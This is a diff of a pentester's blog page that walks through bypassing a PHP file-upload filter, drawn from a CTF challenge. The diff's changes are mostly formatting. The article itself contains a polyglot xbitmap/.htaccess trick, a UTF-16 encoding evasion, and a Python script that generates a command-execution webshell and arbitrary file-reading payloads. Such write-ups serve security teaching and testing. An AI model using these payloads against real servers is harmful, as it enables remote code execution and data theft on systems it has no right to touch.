@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.62.0" />
+<meta name="generator" content="Hugo 0.72.0" />
 
   <meta property="og:title" content="[WEB] Bypass file upload filter with .htaccess" />
 <meta property="og:description" content="" />
@@ -37,6 +37,7 @@
   <link href="//use.fontawesome.com/releases/v5.6.3/css/all.css" rel="stylesheet">
   <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
   <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@500&display=swap" rel="stylesheet">
 
   
   <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
@@ -105,17 +106,17 @@
     <h1 class="brand-title">Thibaud Robin</h1>
     <h2 class="brand-tagline">Alias Th1b4ud</h2>
     <h2 class="brand-tagline">PENTESTER</h2>
-    <p>Personnal blog to speak about cybersecurity, technology and much more !</p>
+    <p>Personnal blog to speak about cybersecurity and Root-Me FAQ</p>
 
     <nav class="nav">
       <ul class="nav-list">
-        <li class="nav-item"><span class="nav-item-separator">//</span><a href="/">Home</a></li>
+        <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/">Home</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/whoami">WHOAMI</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/whoami">WHOAMI</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/writeups">WRITEUPS</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/writeups">WRITEUPS</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/articles">ARTICLES</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/articles">ARTICLES</a></li>
         
       </ul>
     </nav>
@@ -210,7 +211,7 @@
 			
 
             <p>I think you know what I am talking about. The &ldquo;file upload&rdquo; vulnerability is familiar for you ? Nice. So you know how it could be difficult to bypass protection to upload a webshell. I will show you a little technique to add to your test when you are trying to exploit file upload :)</p>
-<p>This technique is inspired from the challenge <strong>l33t-hoster</strong> of the <a href="https://ctftime.org/event/686">Insomni'hack Teaser 2019 CTF</a></p>
+<p>This technique is inspired from the challenge <strong>l33t-hoster</strong> of the <a href="https://ctftime.org/event/686">Insomni&rsquo;hack Teaser 2019 CTF</a></p>
 <p>So follow the guide !</p>
 <h2 id="show-me-your-protection">Show me your protection</h2>
 <p>First step is to understand (at least try) the protection. For this explanation, we will work on a nice PHP example.</p>
@@ -299,18 +300,18 @@ $disallowed_ext <span style="color:#f92672">=</span> <span style="color:#66d9ef"
 <p>To sum up. Filters do :</p>
 <ul>
 <li><strong>Check the file extension</strong>. If the file finish by <code>.php</code> or something like this, it will be refused.</li>
-<li><strong>Check the filename</strong>. If the filename can't be splited in twice with <code>.</code> separator, it will be refused.</li>
+<li><strong>Check the filename</strong>. If the filename can&rsquo;t be splited in twice with <code>.</code> separator, it will be refused.</li>
 <li><strong>Check the content</strong>. If the string <code>&lt;?</code> are present in the content, the file will be refused.</li>
 <li><strong>Check the header</strong>. If the file is not an image, refused it.</li>
-<li><strong>Check the size</strong>. If the file's height and width are not equal to 1337, refused it.</li>
+<li><strong>Check the size</strong>. If the file&rsquo;s height and width are not equal to 1337, refused it.</li>
 </ul>
-<p>Wow ! That's a secured upload form. But you can easily bypass it ;)</p>
+<p>Wow ! That&rsquo;s a secured upload form. But you can easily bypass it ;)</p>
 <h2 id="choose-the-good-file">Choose the good file</h2>
-<p>So, if we recap, we can't upload file with php extension. So the current goal is to have the possibility to execute php code in other file than <code>.php</code>. You can do the trick with <code>.htaccess</code>.</p>
+<p>So, if we recap, we can&rsquo;t upload file with php extension. So the current goal is to have the possibility to execute php code in other file than <code>.php</code>. You can do the trick with <code>.htaccess</code>.</p>
 <p>But what is <code>.htaccess</code> file ?</p>
 <p><em>&quot;.htaccess files provide a way to make configuration changes on a per-directory basis.&quot;</em></p>
 <p>You can read more here : <a href="https://httpd.apache.org/docs/2.4/en/howto/htaccess.html">https://httpd.apache.org/docs/2.4/en/howto/htaccess.html</a></p>
-<p>Pretty clear. Thanks google ! So it's a configuration file. Now look at this conf :</p>
+<p>Pretty clear. Thanks google ! So it&rsquo;s a configuration file. Now look at this conf :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">AddType application/x-httpd-php .php16      <span style="color:#75715e"># Say all file with extension .php16 will execute php</span>
 
 php_value zend.multibyte <span style="color:#ae81ff">1</span>                  <span style="color:#75715e"># Active specific encoding (you will see why after :D)</span>
@@ -321,7 +322,7 @@ php_value display_errors <span style="color:#ae81ff">1</span>                  <
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">lol filename is empty
 </code></pre></div><p>Damned ! But if we analyse the code, we see it split the string in twice with <code>.</code> and check if there is two parts on the obtained array. So if we send a filename like <code>..htaccess</code>, the code will split in two parts : <code>.</code> and <code>.htaccess</code>. Test it !</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">not an image.
-</code></pre></div><p>S**t ! Yeah our file is not an image, it's a htaccess file.</p>
+</code></pre></div><p>S**t ! Yeah our file is not an image, it&rsquo;s a htaccess file.</p>
 <h2 id="welcome-to-polyglot-file">Welcome to polyglot file</h2>
 <p>What is polyglot file ?</p>
 <p><em>&ldquo;In computing, a polyglot is a computer program or script written in a valid form of multiple programming languages, which performs the same operations or output independent of the programming language used to compile or interpret it.&quot;</em></p>
@@ -333,12 +334,12 @@ php_value display_errors <span style="color:#ae81ff">1</span>                  <
 <p>And there is an example :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#define test_width 16</span>
 <span style="color:#75715e">#define test_height 7</span>
-static char test_bits<span style="color:#f92672">[</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
+static char test_bits<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
 0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,
 0x00, 0x60 <span style="color:#f92672">}</span>;
 </code></pre></div><p><strong>OH ! Look at this !</strong></p>
 <p><img src="https://media.giphy.com/media/WuGSL4LFUMQU/giphy.gif" alt="" title=""></p>
-<p>The format of xbitmap is pretty clear : you set the image size on the first line of the file. And we've got a <code>#</code> in front of the line ! So our <code>.htaccess</code> will not be disturbed by the xbitmap header. And with this trick <strong>we bypass size and image filter</strong>. Let's try this.</p>
+<p>The format of xbitmap is pretty clear : you set the image size on the first line of the file. And we&rsquo;ve got a <code>#</code> in front of the line ! So our <code>.htaccess</code> will not be disturbed by the xbitmap header. And with this trick <strong>we bypass size and image filter</strong>. Let&rsquo;s try this.</p>
 <p>There is our new <code>..htaccess</code> file</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#define width 1337                          # Define the width wanted by the code (and say we are a legit xbitmap file lol)</span>
 <span style="color:#75715e">#define height 1337                         # Define the height</span>
@@ -349,7 +350,7 @@ php_value zend.multibyte <span style="color:#ae81ff">1</span>                  <
 php_value zend.detect_unicode <span style="color:#ae81ff">1</span>             <span style="color:#75715e"># Detect if the file have unicode content</span>
 php_value display_errors <span style="color:#ae81ff">1</span>                  <span style="color:#75715e"># Display php errors</span>
 </code></pre></div><p>So upload it ! And oh magic the code accepted our file ! :D
-We don't see our <code>.htaccess</code> because apache default configuration hide all file starting with a <code>.</code></p>
+We don&rsquo;t see our <code>.htaccess</code> because apache default configuration hide all file starting with a <code>.</code></p>
 <p><img src="/img/articles/bypass-filter-upload-3.png" alt="" title=""></p>
 <h2 id="bypass-the-anti-php-protection">Bypass the anti-PHP protection</h2>
 <p>Nice ! I uploaded my <code>.htaccess</code> to run the php contain in my <code>.php16</code> files. But how can I upload php to bypass the filter on the code. The answer is simple : encode your payload.</p>
@@ -371,39 +372,39 @@ We don't see our <code>.htaccess</code> because apache default configuration hid
 <span style="color:#75715e"># Author : Thibaud Robin</span>
 
 <span style="color:#75715e"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span>
-SIZE_HEADER <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">#define width 1337</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">#define height 1337</span><span style="color:#ae81ff">\n</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+SIZE_HEADER <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">#define width 1337</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">#define height 1337</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_php_file</span>(filename, script):
-	phpfile <span style="color:#f92672">=</span> open(filename, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">wb</span><span style="color:#e6db74">&#39;</span>) 
+	phpfile <span style="color:#f92672">=</span> open(filename, <span style="color:#e6db74">&#39;wb&#39;</span>) 
 
-	phpfile<span style="color:#f92672">.</span>write(script<span style="color:#f92672">.</span>encode(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">utf-16be</span><span style="color:#e6db74">&#39;</span>))
+	phpfile<span style="color:#f92672">.</span>write(script<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-16be&#39;</span>))
 	phpfile<span style="color:#f92672">.</span>write(SIZE_HEADER)
 
 	phpfile<span style="color:#f92672">.</span>close()
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_htacess</span>():
-	htaccess <span style="color:#f92672">=</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">..htaccess</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">wb</span><span style="color:#e6db74">&#39;</span>)
+	htaccess <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;..htaccess&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>)
 
 	htaccess<span style="color:#f92672">.</span>write(SIZE_HEADER)
-	htaccess<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">AddType application/x-httpd-php .php16</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-	htaccess<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">php_value zend.multibyte 1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-	htaccess<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">php_value zend.detect_unicode 1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-	htaccess<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">php_value display_errors 1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+	htaccess<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;AddType application/x-httpd-php .php16</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+	htaccess<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;php_value zend.multibyte 1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+	htaccess<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;php_value zend.detect_unicode 1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+	htaccess<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;php_value display_errors 1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
 
 	htaccess<span style="color:#f92672">.</span>close()
 		
 generate_htacess()
 
-generate_php_file(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">webshell.php16</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&lt;?php system($_GET[</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">]); die(); ?&gt;</span><span style="color:#e6db74">&#34;</span>)
-generate_php_file(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">scandir.php16</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&lt;?php echo implode(</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">, scandir($_GET[</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">dir</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">])); die(); ?&gt;</span><span style="color:#e6db74">&#34;</span>)
-generate_php_file(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">getfile.php16</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&lt;?php echo file_get_contents($_GET[</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">file</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">]); die(); ?&gt;</span><span style="color:#e6db74">&#34;</span>)
-generate_php_file(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">info.php16</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&lt;?php phpinfo(); die(); ?&gt;</span><span style="color:#e6db74">&#34;</span>)
+generate_php_file(<span style="color:#e6db74">&#34;webshell.php16&#34;</span>, <span style="color:#e6db74">&#34;&lt;?php system($_GET[&#39;cmd&#39;]); die(); ?&gt;&#34;</span>)
+generate_php_file(<span style="color:#e6db74">&#34;scandir.php16&#34;</span>, <span style="color:#e6db74">&#34;&lt;?php echo implode(&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;, scandir($_GET[&#39;dir&#39;])); die(); ?&gt;&#34;</span>)
+generate_php_file(<span style="color:#e6db74">&#34;getfile.php16&#34;</span>, <span style="color:#e6db74">&#34;&lt;?php echo file_get_contents($_GET[&#39;file&#39;]); die(); ?&gt;&#34;</span>)
+generate_php_file(<span style="color:#e6db74">&#34;info.php16&#34;</span>, <span style="color:#e6db74">&#34;&lt;?php phpinfo(); die(); ?&gt;&#34;</span>)
 </code></pre></div><p>Upload them&hellip;</p>
 <p><img src="/img/articles/bypass-filter-upload-4.png" alt="" title=""></p>
 <p>And enjoy your webshell :)</p>
 <p><img src="/img/articles/bypass-filter-upload-5.png" alt="" title=""></p>
 <h2 id="conclusion">Conclusion</h2>
-<p>It's really complicated to do a good and secure feature of file upload. There will be always a technique to bypass the security. The best way to secure your platform is to use framework which are already secured (a little&hellip;), use <a href="http://php.net/manual/fr/book.imagick.php">ImageMagick</a> functions to check file before to upload it and install a WAF (Web Application Firewall) like ModSecurity in Apache in front of your application.</p>
+<p>It&rsquo;s really complicated to do a good and secure feature of file upload. There will be always a technique to bypass the security. The best way to secure your platform is to use framework which are already secured (a little&hellip;), use <a href="http://php.net/manual/fr/book.imagick.php">ImageMagick</a> functions to check file before to upload it and install a WAF (Web Application Firewall) like ModSecurity in Apache in front of your application.</p>
 <p>And always never trust user input !!!</p>
 <p>See you soon :)</p>
 <p>Th1b4ud</p>
